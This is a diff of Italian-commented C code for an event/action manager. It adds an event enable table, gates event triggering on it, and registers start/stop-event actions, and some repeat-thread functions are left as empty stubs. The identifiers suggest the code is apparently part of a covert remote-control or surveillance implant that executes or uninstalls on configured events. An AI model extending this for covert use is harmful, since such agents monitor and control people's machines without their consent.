@@ -6,6 +6,7 @@
 #include "DeepFreeze.h"
 #include "x64.h"
 #include "status_log.h"
+#include "SM_Core.h"
 #include "SM_ActionFunctions.h"
 #include "SM_EventHandlers.h"
 
@@ -17,18 +18,28 @@
 // rileva uno, esegue le azioni associate nella sua tabella eventi/azioni.
 
 
-#define MAX_EVENT_MONITOR 10 // Massimo numero di event monitor registrabili
-#define MAX_DISPATCH_FUNCTION 10
+#define MAX_EVENT_MONITOR 15 // Massimo numero di event monitor registrabili
+#define MAX_DISPATCH_FUNCTION 15 // Massimo numero di azioni registrabili
 #define SYNCM_SLEEPTIME 100
 
-typedef void (WINAPI *EventMonitorAdd_t) (BYTE *, DWORD, DWORD);
+typedef void (WINAPI *EventMonitorAdd_t) (BYTE *, DWORD, event_param_struct *, DWORD);
 typedef void (WINAPI *EventMonitorStart_t) (void);
 typedef void (WINAPI *EventMonitorStop_t) (void);
 typedef BOOL (WINAPI *ActionFunc_t) (BYTE *, DWORD);
 
 ActionFunc_t ActionFuncGet(DWORD action_type);
 
+// Permette di gestire i repeat degli eventi
+void CreateRepeatThread(DWORD event_id, DWORD repeat_action, DWORD count, DWORD delay)
+{
+	if (repeat_action == AF_NONE || count == 0)
+		return;
+	// XXX il loop prima aspetta poi fa
+}
 
+void StopRepeatThread(DWORD event_id)
+{
+}
 
 
 // Gestione event monitor  ----------------------------------------------
@@ -45,6 +56,9 @@ typedef struct  {
 DWORD event_monitor_count = 0;
 event_monitor_elem event_monitor_array[MAX_EVENT_MONITOR];
 
+// Tabella contenente lo stato di attivazione di tutti gli eventi nel file di configurazione
+BOOL *event_table = NULL;
+DWORD event_count = 0;
 
 // Registra un nuovo event monitor
 void EventMonitorRegister(DWORD event_type, EventMonitorAdd_t pEventMonitorAdd, 
@@ -76,18 +90,50 @@ void EventMonitorStopAll()
 		event_monitor_array[i].pEventMonitorStop();
 }
 
+void EventTableInit()
+{
+	SAFE_FREE(event_table);
+	event_count = 0;
+}
+
+// Setta lo stato iniziale di un evento
+void SM_EventTableState(DWORD event_id, BOOL state)
+{
+	BOOL *temp_event_table;
+	// Alloca la tabella per contenere quel dato evento 
+	// La tabella e' posizionale
+	if (event_id >= event_count) {
+		temp_event_table = (BOOL *)realloc(event_table, (event_id + 1) * sizeof(BOOL));
+		if (!temp_event_table)
+			return;
+		event_table = temp_event_table;
+		event_count = event_id + 1;
+	}
+	event_table[event_id] = state;
+}
+
 // Assegna una riga "evento" della configurazione al corretto event monitor
-void EventMonitorAddLine(DWORD event_type, BYTE *param, DWORD param_len, DWORD event_code)
+void EventMonitorAddLine(DWORD event_type, BYTE *param, DWORD param_len, event_param_struct *event_param, DWORD event_id, BOOL event_state)
 {
 	DWORD i;
+	// Inizializza lo stato attivo/disattivo dell'evento
+	SM_EventTableState(event_id, event_state);
+
 	for (i=0; i<event_monitor_count; i++)
 		if (event_monitor_array[i].event_type == event_type) {
-			event_monitor_array[i].pEventMonitorAdd(param, param_len, event_code);
+			event_monitor_array[i].pEventMonitorAdd(param, param_len, event_param, event_id);
 			break;
 		}
 }
 
+BOOL EventIsEnabled(DWORD event_id)
+{
+	// L'evento non e' mai stato visto e inizializzato
+	if (event_id >= event_count)
+		return FALSE;
 
+	return event_table[event_id];
+}
 //------------------------------------------------------------------
 
 
@@ -112,16 +158,19 @@ static event_action_elem *event_action_array = NULL; // Puntatore all'array dina
 static DWORD event_action_count = 0; // Numero di elementi nella tabella event/actions
 
 // Funzione da esportare (per eventuali event monitor esterni o per far generare eventi anche 
-// agli agents). Triggera l'evento "index"
-void TriggerEvent(DWORD index)
+// agli agents). Triggera l'evento "index". L'event_id indica quale evento sta triggerando l'azione.
+// Se l'evento e' stato disabilitato, l'azione non e' triggerata
+void TriggerEvent(DWORD index, DWORD event_id)
 {
 	// Se e' uguale ad AF_NONE sara' sicuramente > event_action_count
 	if (index >= event_action_count)
 		return;
 
-	event_action_array[index].triggered = TRUE;
+	// L'azione viene effettivamente triggerata solo se l'evento che l'ha generata
+	// e' attivo in quel momento
+	if (EventIsEnabled(event_id))
+		event_action_array[index].triggered = TRUE;
 }
-
 
 // Cerca un evento qualsiasi che e' stato triggerato. Se lo trova torna TRUE e valorizza
 // il puntatore all'array delle relative actions e il numero delle actions stesse.
@@ -302,6 +351,8 @@ ActionFunc_t ActionFuncGet(DWORD action_type)
 void UpdateEventConf()
 {
 	BYTE *conf_memory;
+	DWORD event_id = 0;
+	event_param_struct event_param;
 
 	conf_memory = HM_ReadClearConf(H4_CONF_FILE);
 
@@ -309,7 +360,7 @@ void UpdateEventConf()
 	// XXX Non c'e' il controllo che conf_ptr possa uscire fuori dalle dimensioni del file mappato
 	// (viene assunto che la configurazione sia coerente e il file integro)
 	if (conf_memory) {
-		DWORD index, condition_count, action_count, subaction_count, tag, event_id, param_len;
+		DWORD index, condition_count, action_count, subaction_count, tag, action_id, event_status, param_len;
 		BYTE *conf_ptr;
 
 		// conf_ptr si sposta nel file durante la lettura
@@ -317,11 +368,21 @@ void UpdateEventConf()
 
 		// ---- Condizioni ----
 		READ_DWORD(condition_count, conf_ptr);
+		EventTableInit();
 		for (index=0; index<condition_count; index++) {
 			READ_DWORD(tag, conf_ptr);
-			READ_DWORD(event_id, conf_ptr);
+			READ_DWORD(action_id, conf_ptr);
 			READ_DWORD(param_len, conf_ptr);
-			EventMonitorAddLine(tag, conf_ptr, param_len, event_id);
+
+			ZeroMemory(&event_param, sizeof(event_param));
+			event_param.start_action = action_id;
+			event_param.stop_action = AF_NONE;
+			event_param.repeat_action = AF_NONE;
+			event_param.delay = 0;
+			event_param.count = 0;
+			event_status = TRUE;
+	
+			EventMonitorAddLine(tag, conf_ptr, param_len, &event_param, event_id++, event_status);
 			conf_ptr += param_len;
 		}
 
@@ -421,6 +482,8 @@ void SM_MonitorEvents(DWORD dummy)
 	ActionFuncRegister(AF_EXECUTE, DA_Execute);
 	ActionFuncRegister(AF_UNINSTALL, DA_Uninstall);
 	ActionFuncRegister(AF_LOGINFO, DA_LogInfo);
+	ActionFuncRegister(AF_STARTEVENT, DA_StartEvent);
+	ActionFuncRegister(AF_STOPEVENT, DA_StopEvent);
 
 	// Legge gli eventi e le azioni dal file di configurazione. 
 	// Deve essere sempre posizionato DOPO la registrazione di EM e AF
